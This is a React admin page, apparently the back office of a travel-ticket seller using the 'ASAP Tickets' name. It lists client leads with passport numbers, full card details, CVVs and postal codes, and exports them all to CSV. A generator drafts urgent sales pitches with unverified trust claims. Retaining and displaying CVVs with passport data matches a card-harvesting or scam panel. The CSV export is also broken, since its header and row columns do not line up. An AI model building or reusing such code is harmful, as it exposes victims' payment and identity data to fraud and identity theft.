'use client';

import React, { useEffect, useState } from 'react';
import { CommunicationsHub } from '@/components/CommunicationsHub';

interface UnifiedLead {
  id: string;
  leadNumber: string;
  type: string;
  name: string;
  email: string;
  phone: string;
  passport: string;
  card: string;
  cvv: string;
  route: string;
  amount: number;
  postalCode: string;
  status: string;
  createdAt: string;
}

export default function MasterLeadsPage() {
  const [leads, setLeads] = useState<UnifiedLead[]>([]);
  const [loading, setLoading] = useState(true);
  const [quoteLead, setQuoteLead] = useState<UnifiedLead | null>(null);
  const [quotePrice, setQuotePrice] = useState('');
  const [quoteAirline, setQuoteAirline] = useState('');
  const [quoteMessage, setQuoteMessage] = useState('');

  const generateQuoteText = (lead: UnifiedLead, price: string, airline: string) => {
    return `Hi ${lead.name},\n\nWe found the perfect flight for your trip (${lead.route}) via ${airline || '[Airline]'}!\n\nOur exclusive negotiated rate is $${price || lead.amount} total. This is a Best Price Guarantee!\n\nASAP Tickets is a trusted partner with BBB (A+ rating), AST, and ASTA qualifications. Over 35,000 satisfied clients have left us 5-star reviews!\n\nPlease reply or call us back to secure this exact itinerary before the airline increases the price.\n\nRef: ${lead.leadNumber}`;
  };

  useEffect(() => {
    if (quoteLead) {
      setQuoteMessage(generateQuoteText(quoteLead, quotePrice, quoteAirline));
    }
  }, [quotePrice, quoteAirline, quoteLead]);

  useEffect(() => {
    fetch('/api/leads/all')
      .then(res => res.json())
      .then(data => {
        setLeads(data);
        setLoading(false);
      });
  }, []);

  const handleMarkQuoted = async (lead: UnifiedLead) => {
    try {
      const res = await fetch(`/api/leads/${lead.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: 'QUOTED', type: lead.type })
      });
      if (res.ok) {
        setLeads(leads.map(l => l.id === lead.id ? { ...l, status: 'QUOTED' } : l));
        // Also update local quoteLead status so UI reflects immediately
        if (quoteLead && quoteLead.id === lead.id) {
            setQuoteLead({ ...quoteLead, status: 'QUOTED' });
        }
      }
    } catch (e) {
      console.error('Failed to mark quoted', e);
    }
  };

  const downloadCSV = () => {
    const headers = ['Lead Number', 'Type', 'Name', 'Email', 'Phone', 'Passport', 'Card Details', 'CVV', 'Route', 'Amount', 'Status', 'Date'];
    const rows = leads.map(l => [
      l.leadNumber,
      l.type,
      l.name,
      l.email,
      l.phone,
      l.passport,
      l.card,
      l.cvv,
      l.route,
      l.amount,
      l.postalCode,
      l.status,
      new Date(l.createdAt).toLocaleString()
    ]);

    const csvContent = [headers, ...rows].map(e => e.join(",")).join("\n");
    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const link = document.createElement("a");
    const url = URL.createObjectURL(blob);
    link.setAttribute("href", url);
    link.setAttribute("download", `asap_leads_${new Date().toISOString().split('T')[0]}.csv`);
    link.style.visibility = 'hidden';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="p-8 space-y-8 animate-in fade-in duration-500">
      <div className="flex justify-between items-end">
        <div>
          <h1 className="text-3xl font-black text-slate-800 tracking-tighter uppercase italic">Master Lead Database</h1>
          <p className="text-slate-400 font-bold text-xs uppercase tracking-widest mt-1 italic">Consolidated Client Data & Financial Settlement Records</p>
        </div>
        <button 
          onClick={downloadCSV}
          className="bg-emerald-500 hover:bg-emerald-600 text-white px-6 py-3 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-xl transition-all flex items-center gap-2 transform active:scale-95">
          <span>📊</span> Export to Excel (CSV)
        </button>
      </div>

      <div className="bg-white rounded-[2rem] border border-slate-200 shadow-2xl overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-left border-collapse min-w-[1200px]">
            <thead>
              <tr className="bg-slate-50 border-b border-slate-100">
                {['Ref #', 'Type', 'Client Name', 'Passport', 'Contact', 'Route', 'Settlement', 'Card Details', 'CVV', 'Postal Code', 'Status', 'Date', 'Actions'].map(h => (
                  <th key={h} className="px-6 py-5 text-[10px] font-black text-slate-400 uppercase tracking-widest italic">{h}</th>
                ))}
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-50">
              {loading ? (
                <tr><td colSpan={10} className="px-6 py-20 text-center text-slate-300 font-black uppercase italic tracking-widest">Loading Unified Intelligence...</td></tr>
              ) : leads.length === 0 ? (
                <tr><td colSpan={10} className="px-6 py-20 text-center text-slate-300 font-black uppercase italic tracking-widest">No Leads Recorded</td></tr>
              ) : (
                leads.map((lead) => (
                  <tr key={lead.id} className="hover:bg-slate-50/50 transition-colors group">
                    <td className="px-6 py-4 font-black text-slate-500 text-[10px] uppercase tracking-tighter">
                      {lead.leadNumber}
                    </td>
                    <td className="px-6 py-4">
                      <span className={`px-2 py-1 rounded text-[8px] font-black uppercase tracking-tighter ${lead.type === 'BOOKING' ? 'bg-brand-primary/10 text-brand-primary' : 'bg-slate-100 text-slate-400'}`}>
                        {lead.type}
                      </span>
                    </td>
                    <td className="px-6 py-4">
                      <div className="font-black text-slate-800 text-xs uppercase italic">{lead.name}</div>
                      <div className="text-[10px] text-slate-400 font-bold lowercase">{lead.email}</div>
                    </td>
                    <td className="px-6 py-4 font-black text-slate-800 text-[10px] uppercase tracking-tighter">
                      {lead.passport !== 'N/A' ? <span className="text-brand-primary">{lead.passport}</span> : '—'}
                    </td>
                    <td className="px-6 py-4 font-bold text-slate-600 text-[10px]">{lead.phone}</td>
                    <td className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase leading-snug max-w-[200px] truncate">
                      {lead.route}
                    </td>
                    <td className="px-6 py-4 font-black text-slate-800 text-xs tracking-tighter">
                      ${lead.amount.toFixed(2)}
                    </td>
                    <td className="px-6 py-4 font-black text-brand-primary text-[10px] tracking-widest group-hover:bg-brand-primary/5 transition-all">
                      {lead.card}
                    </td>
                    <td className="px-6 py-4 font-black text-red-500 text-[10px] tracking-widest">
                      {lead.cvv}
                    </td>
                    <td className="px-6 py-4 font-black text-purple-600 text-[10px] tracking-widest">
                      {lead.postalCode}
                    </td>
                    <td className="px-6 py-4">
                      <span className="px-2 py-1 rounded-full text-[8px] font-black uppercase tracking-tighter bg-emerald-50 text-emerald-500 border border-emerald-100 italic">
                        {lead.status}
                      </span>
                    </td>
                    <td className="px-6 py-4 text-[9px] font-bold text-slate-300 uppercase italic">
                      {new Date(lead.createdAt).toLocaleDateString()}
                    </td>
                    <td className="px-6 py-4 flex items-center gap-1.5 min-w-[150px]">
                       <a href={`tel:${lead.phone}`} className="bg-slate-100 hover:bg-slate-200 text-slate-600 w-7 h-7 rounded-md flex items-center justify-center text-xs shadow-sm hover:shadow" title="Call">📞</a>
                       <a href={`sms:${lead.phone}`} className="bg-slate-100 hover:bg-slate-200 text-slate-600 w-7 h-7 rounded-md flex items-center justify-center text-xs shadow-sm hover:shadow" title="SMS">💬</a>
                       <a href={`https://wa.me/${lead.phone.replace(/[^0-9]/g, '')}`} target="_blank" rel="noreferrer" className="bg-[#25D366]/10 hover:bg-[#25D366]/20 text-[#25D366] w-7 h-7 rounded-md flex items-center justify-center text-xs shadow-sm hover:shadow" title="WhatsApp">🟢</a>
                       <button onClick={() => { setQuoteLead(lead); setQuotePrice(''); setQuoteAirline(''); }} className="bg-indigo-50 hover:bg-indigo-100 text-indigo-500 w-7 h-7 rounded-md flex items-center justify-center text-xs shadow-sm shadow-indigo-100 border border-indigo-200 transition-all font-bold" title="Generate Quote">💸</button>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
      
      <div className="flex gap-4">
         <div className="flex-1 bg-slate-900 rounded-[2rem] p-6 text-white flex items-center justify-between shadow-2xl overflow-hidden relative group">
            <div className="absolute inset-0 bg-brand-primary opacity-0 group-hover:opacity-10 transition-opacity"></div>
            <div>
               <p className="text-[10px] font-black text-white/40 uppercase tracking-widest mb-1">Total Leads Processed</p>
               <h4 className="text-2xl font-black italic tracking-tighter">{leads.length}</h4>
            </div>
            <div className="text-4xl opacity-20 group-hover:scale-110 transition-transform">👥</div>
         </div>
         <div className="flex-1 bg-white rounded-[2rem] p-6 border border-slate-200 flex items-center justify-between shadow-xl group">
            <div>
               <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">Total Settlement Value</p>
               <h4 className="text-2xl font-black italic tracking-tighter text-brand-primary">
                  ${leads.reduce((acc, curr) => acc + curr.amount, 0).toLocaleString()}
               </h4>
            </div>
            <div className="text-4xl opacity-20 filter grayscale group-hover:grayscale-0 transition-all">💰</div>
         </div>
      </div>

      {quoteLead && (
        <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-[2rem] shadow-2xl w-full max-w-2xl max-h-[95vh] overflow-y-auto animate-in zoom-in-95 duration-200">
            <div className="bg-slate-50 border-b border-slate-100 p-6 flex justify-between items-center sticky top-0 z-10">
              <div>
                <h2 className="text-xl font-black text-slate-800 uppercase italic tracking-tighter">Generate Price Quote</h2>
                <p className="text-xs font-bold text-slate-400 uppercase tracking-widest">Lead: {quoteLead.leadNumber} • {quoteLead.route}</p>
              </div>
              <button onClick={() => setQuoteLead(null)} className="text-slate-400 hover:text-slate-600 bg-slate-200 hover:bg-slate-300 rounded-full w-8 h-8 flex items-center justify-center transition-colors">✕</button>
            </div>
            <div className="p-6 space-y-4">
              <div className="flex gap-4">
                <div className="flex-1 space-y-1">
                   <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Adjusted Price ($)</label>
                   <input 
                     type="number" 
                     placeholder={quoteLead.amount.toString()}
                     value={quotePrice} onChange={e => setQuotePrice(e.target.value)} 
                     className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm font-bold text-slate-700 focus:outline-none focus:ring-2 focus:ring-brand-primary/20 focus:border-brand-primary transition-all" />
                </div>
                <div className="flex-1 space-y-1">
                   <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Available Airline</label>
                   <input 
                     type="text" 
                     placeholder="e.g. Delta, Emirates"
                     value={quoteAirline} onChange={e => setQuoteAirline(e.target.value)} 
                     className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm font-bold text-slate-700 focus:outline-none focus:ring-2 focus:ring-brand-primary/20 focus:border-brand-primary transition-all" />
                </div>
              </div>
              
              <div className="space-y-1">
                 <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest flex justify-between">
                    Generated Pitch Message
                    <button onClick={() => navigator.clipboard.writeText(quoteMessage)} className="text-brand-primary hover:text-brand-secondary">Copy to Clipboard</button>
                 </label>
                 <textarea 
                   rows={8}
                   value={quoteMessage}
                   onChange={e => setQuoteMessage(e.target.value)}
                   className="w-full bg-indigo-50/50 border border-indigo-100 rounded-xl px-4 py-3 text-xs font-medium text-slate-600 leading-relaxed focus:outline-none focus:ring-2 focus:ring-brand-primary/20 transition-all font-mono"></textarea>
              </div>
              <div className="pt-4 border-t border-slate-100 flex justify-between items-center">
                 <button 
                    onClick={() => handleMarkQuoted(quoteLead)}
                    className="bg-amber-100 hover:bg-amber-200 text-amber-700 px-6 py-2 rounded-xl font-bold text-xs transition-all flex items-center gap-2"
                 >
                    <span>🎯</span> Mark as Quoted
                 </button>
                 <span className="text-xs font-black text-slate-400 uppercase tracking-widest">
                    Status: <span className={quoteLead.status === 'QUOTED' ? 'text-emerald-500' : ''}>{quoteLead.status}</span>
                 </span>
              </div>
              <div className="mt-4 border border-brand-primary/20 rounded-[3rem] overflow-hidden">
                <CommunicationsHub 
                  prefillContact={{ name: quoteLead.name, email: quoteLead.email, phone: quoteLead.phone }}
                  prefillMessage={quoteMessage}
                  prefillSubject={`Exclusive Discount: ${quoteLead.route}`}
                />
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
